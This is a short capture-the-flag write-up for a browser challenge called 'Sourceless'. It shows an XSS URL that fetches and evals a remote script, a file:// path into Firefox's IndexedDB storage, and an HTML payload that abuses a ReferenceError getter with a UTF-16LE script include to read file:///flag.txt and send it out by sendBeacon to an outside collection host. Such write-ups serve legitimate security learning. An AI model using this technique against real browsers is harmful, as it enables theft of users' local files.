### Sourceless solution

0. Spawn glitch by going to https://terjanq-logger.glitch.me/ and wait for it to load.
1. Send admin to `https://terjanq.me/xss.php?js=fetch(%27https://gist.githubusercontent.com/terjanq/32181ae8da2ed8b76fae6ef59e813390/raw/7fb8bf95c2447350e4b38b30135667ace3044acb/sourceless-exploit.js%27).then(e=%3Ee.text()).then(e=%3Eeval(e))`
   * This will add an explot file in IndexedDB
2. Send admin to `file:///tmp/firefox-userdata/storage/default/https+++terjanq.me^userContextId=6/idb/2774579512mByD.files/1`
   * This is file added to the IndexedDB. It will sniff it as HTML and then leak `file:///flag.txt`
   * NOTE: after multiple tries, the userContextId incrments, you might want to brute-force the value. Simirarly `2774579512mByD` might be different if you used a different DB name.
3. Visit https://terjanq-logger.glitch.me/log2?id=sourceless&secret=aoceb2eqbyqn2x0b0pladswaggvql4rtl72r6exrqjfq1uauamxpi that should include the leaked flag

The exploit is basically:

```html
  <script>
    ReferenceError.prototype.__defineGetter__('name', function(){
      const variable = this.message.split(' is ')[0];
      let decoded = '';

      for(const u16 of [...variable]){
        const i = u16.charCodeAt(0);
        decoded += String.fromCharCode(i % 256);
        decoded += String.fromCharCode(i >> 8);
      }
      navigator.sendBeacon('https://bin.graversen.io/api/d758ecef-efdb-4e9e-9c7d-47e966bf8524', decoded)
    });
  </script>
  <script charset=utf-16le src="file:///flag.txt"></script>
```
